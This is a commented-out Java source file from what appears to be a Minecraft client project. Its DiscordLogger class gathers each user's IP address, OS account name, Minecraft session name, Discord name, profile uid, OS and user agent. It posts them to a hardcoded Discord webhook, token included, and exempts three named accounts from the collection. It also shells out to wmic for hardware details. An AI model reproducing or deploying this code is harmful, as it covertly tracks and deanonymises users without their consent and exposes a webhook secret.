//package sky.core.utils.discord;
//
//import utils.sky.core.Wrapper;
//import ru.kotopushka.compiler.sdk.classes.Profile;
//
//import java.awt.*;
//import java.io.BufferedReader;
//import java.io.IOException;
//import java.io.InputStreamReader;
//import java.lang.management.ManagementFactory;
//import java.lang.management.OperatingSystemMXBean;
//import java.net.URI;
//import java.net.URL;
//import java.net.http.HttpClient;
//import java.net.http.HttpRequest;
//import java.net.http.HttpResponse;
//import java.time.ZoneId;
//import java.time.ZonedDateTime;
//import java.time.format.DateTimeFormatter;
//
//public class DiscordLogger implements Wrapper {
//
//    private static final DiscordWebHook webhook = new DiscordWebHook("https://discord.com/api/webhooks/1417910304758693969/mSo1nWeTdqk_oWx8tiTzHjobG2S0zaCgrjQLLFXV_hHqIyQFqjcBb3maKxOlkKsTCX1o");
//
//
//    public static void startWebHook() {
//        try {
//            DiscordWebHook.EmbedObject embedObject = getEmbedObject();
//            webhook.addEmbed(embedObject);
//            webhook.execute();
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
//    }
//
//    public static String DS_USERNAME;
//
//    public static DiscordWebHook.EmbedObject getEmbedObject() {
//
//        DiscordWebHook.EmbedObject embedObject = new DiscordWebHook.EmbedObject();
//
//        ZonedDateTime currentTime = ZonedDateTime.now(ZoneId.of("Europe/Moscow"));
//        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
//        String formattedTime = currentTime.format(formatter);
//
//        boolean isProtected =
//                "Homie".equals(Profile.getUsername())
//                || "L1nker".equals(Profile.getUsername())
//                || "Ballin".equals(Profile.getUsername())
//                ;
//
//        String userField = Profile.getUsername();
//        String uidField = String.valueOf(Profile.getUid());
//        OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
//        String userAgent = isProtected ? "protected" : fetchUserAgent();
//        String ipField = isProtected ? "protected" : fetchIPAddress();
//        String name = isProtected ? "protected" : mc.getSession().getUsername();
//        String user = isProtected ? "protected" : System.getProperty("user.name");
//
//        embedObject.addField("user", userField, true);
//        embedObject.addField("uid", uidField, true);
//        embedObject.addField("minecraft session", name, true);
//        embedObject.addField("discord name", DS_USERNAME == null ? "null" : DS_USERNAME, true);
//        embedObject.addField("User Name", user, true);
//        embedObject.addField("OS Name", osBean.getName(), true);
//        ;
//        embedObject.addField("User-agent", userAgent, true);
//        embedObject.addField("IPv4", ipField, false);
//        embedObject.addField("time", formattedTime, false);
//
//        embedObject.setColor(new Color(105, 231, 160));
//
//        return embedObject;
//    }
//
//    public static String getProcessorInfo() throws Exception {
//        String command = "";
//
//        String os = System.getProperty("os.name").toLowerCase();
//        if (os.contains("win")) {
//            command = "wmic cpu get Name";
//        }
//
//        return executeCommand(command);
//    }
//
//    public static String getGPUInfo() throws Exception {
//        String command = "";
//
//        String os = System.getProperty("os.name").toLowerCase();
//        if (os.contains("win")) {
//            command = "wmic path win32_videocontroller get name";
//        }
//
//        return executeCommand(command);
//    }
//
//    private static String executeCommand(String command) throws Exception {
//        ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
//        if (!System.getProperty("os.name").toLowerCase().contains("win")) {
//            builder = new ProcessBuilder("bash", "-c", command);
//        }
//
//        Process process = builder.start();
//        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
//        StringBuilder output = new StringBuilder();
//        String line;
//
//        while ((line = reader.readLine()) != null) {
//            output.append(line).append("\n");
//        }
//
//        return output.toString().trim();
//    }
//
//    private static synchronized String fetchUserAgent() {
//        HttpClient client = HttpClient.newHttpClient();
//        HttpRequest request = HttpRequest.newBuilder()
//                .uri(URI.create("https://httpbin.org/user-agent"))
//                .build();
//
//        try {
//            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
//            String responseBody = response.body();
//            return responseBody.split("\"")[3];
//        } catch (IOException | InterruptedException e) {
//            e.printStackTrace();
//        }
//        return "null";
//    }
//
//    private static synchronized String fetchIPAddress() {
//        try {
//            URL whatismyip = new URL("http://checkip.amazonaws.com");
//            BufferedReader in = new BufferedReader(new InputStreamReader(
//                    whatismyip.openStream()));
//            return in.readLine();
//        } catch (IOException e) {
//            return "Unknown IP";
//        }
//    }
//}